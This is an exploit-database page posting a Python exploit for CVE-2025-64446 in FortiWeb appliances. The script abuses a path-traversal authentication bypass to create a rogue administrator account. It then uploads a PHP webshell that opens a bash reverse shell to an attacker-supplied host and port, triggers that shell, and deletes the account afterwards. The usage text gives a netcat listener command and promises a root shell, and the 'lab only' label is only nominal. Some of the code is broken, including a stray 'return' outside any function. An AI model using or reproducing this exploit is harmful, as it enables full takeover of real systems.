---
title: FortiWeb  8.0.2 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026040011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-14
fetch_date: 2026-04-15T04:42:40.073551
---

# FortiWeb  8.0.2 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FortiWeb 8.0.2 Remote Code Execution** **2026.04.14**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-64446](https://cxsecurity.com/cveshow/CVE-2025-64446/ "Click to see CVE-2025-64446")**  CWE: **N/A** | |

# Exploit Title: FortiWeb 8.0.2 - Remote Code Execution
# Date: 2025-11-22
# Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.fortinet.com
# Software Link: https://www.fortinet.com/products/web-application-firewall/fortiweb
# Version: FortiWeb < 7.6.7, < 7.8.7, < 8.0.2
# Tested on: FortiWeb 7.4.2, 7.6.0, 7.6.1 (VM builds)
# CVE: CVE-2025-64446
# CVSS: 9.8 (Critical)
# Category: WebApps
# Platform: Hardware/Appliance (Linux-based)
# CRITICAL: True
# Including: Authentication Bypass + Path Traversal + Arbitrary File Upload → RCE
# Impact: Full system compromise, root reverse shell
# Fix: Upgrade to FortiWeb 7.6.7, 7.8.7, 8.0.2 or later
# Advisory: https://www.fortinet.com/support/psirt/FG-IR-25-64446
# Patch: https://support.fortinet.com
# Target: FortiWeb management interface (default port 8443)
import requests, sys, time, base64
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)
def banner():
print("""
CVE-2025-64446 FortiWeb RCE Exploit
Author: Mohammed Idrees Banyamer | @banyamer\_security
LAB / AUTHORIZED TESTING ONLY
""")
if len(sys.argv) != 4:
banner()
print("Usage : python3 fortiweb\_rce.py <target> <lhost> <lport>")
print("Example: python3 fortiweb\_rce.py https://192.168.100.50:8443 192.168.45.10 4444")
print("\nSteps:")
print(" 1. Start listener → nc -lvnp 4444")
print(" 2. Run exploit → python3 fortiweb\_rce.py <target> <your\_ip> 4444")
print(" 3. Get root shell → enjoy\n")
sys.exit(1)
banner()
target = sys.argv[1].rstrip("/")
LHOST = sys.argv[2]
LPORT = sys.argv[3]
print(f"[\*] Target : {target}")
print(f"[\*] Callback : {LHOST}:{LPORT}\n")
s = requests.Session()
s.verify = False
s.headers = {"Content-Type": "application/json"}
print("[1] Creating temporary admin user...")
payload = {"../../mkey": "pwnedadmin", "password": "Pwned123!", "isadmin": "1", "status": "enable"}
r = s.post(f"{target}/api/v2.0/user/local.add", json=payload, timeout=10)
if r.status\_code != 200 or "success" not in r.text:
print("[-] Failed to create admin → Target is likely patched")
return
print("[2] Logging in with new admin...")
login = s.post(f"{target}/api/v2.0/login", json={"username":"pwnedadmin","password":"Pwned123!"}, timeout=10)
if "success" not in login.text:
print("[-] Login failed")
return
shell = f'<?php system("bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'"); ?>'
b64shell = base64.b64encode(shell.encode()).decode() + "AAA=="
print("[3] Uploading webshell via backup function...")
files = {'upload-file': ('pwned.dat', b64shell, 'application/octet-stream')}
s.post(f"{target}/api/v2.0/system/maintenance/backup", files=files, timeout=15)
print(f"[4] Triggering reverse shell to {LHOST}:{LPORT} ...")
s.get(f"{target}/pwned.dat", timeout=10)
time.sleep(8)
print("[5] Cleaning up temporary admin account...")
s.post(f"{target}/api/v2.0/user/local.delete", json={"../../mkey":"pwnedadmin"})
print("\n[+] Exploit completed – check your listener for root shell!")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top